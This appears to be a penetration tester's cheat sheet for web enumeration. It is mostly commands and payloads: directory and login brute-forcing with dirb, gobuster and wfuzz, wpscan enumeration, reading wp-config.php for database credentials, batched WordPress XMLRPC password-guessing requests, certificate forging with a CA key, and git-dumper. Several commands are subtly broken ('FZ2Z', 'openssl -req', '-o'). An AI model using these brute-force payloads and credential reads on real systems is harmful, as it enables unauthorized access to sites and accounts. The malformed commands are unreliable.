# Enumeration

## Directory traversal

### Check for page formats

```
index.html    #static
index.php
index.asp     #IIS
index.aspx    #IIS
index.do
```

### DIRB

```
dirb <site url> -r -z <delay ms>                    #non recursive
dirb <site or internal folder url> -z <delay>       #full scan / folder recursive scan
dirb <site or internal folder url> -w               #ignore warnings (to use when not logged in)
```

#### With dictionary

```
dirb <site url> <dictionary>
```

#### Detailed scan

Fine tune + case insensitive

```
dirb <site url> <dict> -if
```

### Gobuster

```
gobuster dir -u <domain> -w <path to dict> -s '<http codes i.e. 200,403>' -ek
gobuster dir -u <domain> -w <path to dict> -s '<http codes i.e. 200,403>' -x <file extension> -ek
```

#### Work via proxy

Only SOCKS 5 is supported

```
gobuster dir -p socks5://127.0.0.1:<proxy port> -u <url> -w <dict> -ek
```

#### Dictionaries for bruteforce

```
ls -alh /usr/share/seclists/Discovery/Web-Content
```

#### Interesting HTTP codes:

* **200 204** OK
* **301 302 307** Redirect (can be ignored for more refined results)
* **401** Login required (can be bruteforced)
* **403** Forbidden (can be used to locate admin pages)
* **500** Server error

## Nikto

```
nikto -host <site url> -port <port> -maxtime <max time for scan>
nikto -host <site url> -port <port> -dbcheck
```

## WFUZZ

Will replace any instance of the string FUZZ with an entry from a specified dictionary. Can be used to bruteforce pages, script arguments and search for RFI or SQLi vulnerable arguments. The FUZZ keyword can be inserted in every part of the URL or even concatenated with argument strings.

### Directory traversal

```
wfuzz -w <wordlist> <url>/FUZZ -R 4 --sc BBB
wfuzz -w <wordlist> <url>/FUZZ -R 4 --hc 0    #hide empty responses
```

If the server has a custom message for 404 code, you can use the length of the error message as a parameter to distinguish from missing pages and existing ones even if the server always returns 200 as response.

### GET bruteforce

#### Bruteforce argument name

```
wfuzz -w <wordlist> <url>/?FUZZ=test -R 4 --sc BBB
```

#### Bruteforce GET login

```
 wfuzz -z file,<user list> -z file,<pass list> --sc 200,301,302 <url>?user=FUZZ&pass=FUZ2Z
```

### POST bruteforce

#### bruteforce argument

```
wfuzz -w <wordlist> <url> -d <arg>=FUZZ
```

#### POST form bruteforce

```
wfuzz -w <user list> -w <pass list> --sc BBB -d user=FUZZ,pass=FZ2Z
```

## Wordpress

### Enumeration

```http
wpscan --url <host> --enumerate ap,at,cb,dbe
```

Remember to search listed plugins and modules for vulnerabilities.

### Credentials dump:

This file contains plain-text username and password for database login. Sometimes these credentials can also be used to authenticate as another user on target machine.

```http
cat <wp folder>/wp-config.php
```

### XMLRPC

#### Google Dorks

```
inurl:"/xmlrpc.php?rsd"
intitle:"WordPress" inurl:"readme.html"
allinurl:"wp-content/plugins/"
```

#### List methods

```http
POST /xmlrpc.php HTTP/1.1
Host: <host>
Content-Length: 135

<?xml version="1.0" encoding="utf-8"?> 
<methodCall> 
<methodName>system.listMethods</methodName> 
<params></params> 
</methodCall>
```

#### Invoke method

```http
POST /xmlrpc.php HTTP/1.1
Host: <host>
Content-Length: 130

<?xml version="1.0" encoding="utf-8"?> 
<methodCall> 
<methodName>demo.sayHello</methodName> 
<params></params> 
</methodCall>
```

#### Single login attempt

```http
POST /xmlrpc.php HTTP/1.1
Host: example.com
Content-Length: 235

<?xml version="1.0" encoding="UTF-8"?>
<methodCall> 
<methodName>wp.getUsersBlogs</methodName> 
<params> 
<param><value>{USER}</value></param> 
<param><value>{PASS}</value></param> 
</params> 
</methodCall>
```

#### Multiple attempts in single request

```http
POST /xmlrpc.php HTTP/1.1
Host: example.com
Content-Length: 1560

<?xml version="1.0"?>
<methodCall><methodName>system.multicall</methodName><params><param><value><array><data>

<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>{USER}</string></value><value><string>{PASS}</string></value></data></array></value></data></array></value></member></struct></value>

<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>{USER}</string></value><value><string>{PASS}</string></value></data></array></value></data></array></value></member></struct></value>

<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>{USER}</string></value><value><string>{PASS}</string></value></data></array></value></data></array></value></member></struct></value>

<value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><array><data><value><string>{USER}</string></value><value><string>{PASS}</string></value></data></array></value></data></array></value></member></struct></value>

</data></array></value></param></params></methodCall>
```

## Dumping certificates

```
openssl s_client -connect <ip>
openssl x509 -in <file>.pem -text #pretty print certificate 
```

### Create own certificate

Create and sign a certificate from a given Certificate Authority and private .pem key. After creation import the certificate in your browser.

```
openssl genrsa -out <name>.key 2048
openssl -req -new -key <name>.key -out <cert>.csr
openssl x509 -req -in <cert>.csr -CA <cert authority> -CAkey <remote key>.key -CAcreateSerial -days 1024 -sha256 -o <file>.pem
openssl pkcs12 -export -out <file>.pfx -in <file>.pem -inkey <name>.key -certfile <remote cert>.cert
```

## Git repository

If you happen to find a .git folder on a server, you can dump all the files in the repository even if not directly accessible (403 error) with the following tool: [https://github.com/arthaud/git-dumper](https://github.com/arthaud/git-dumper)

```
python3 git-dumper.py <url> <local folder>
```
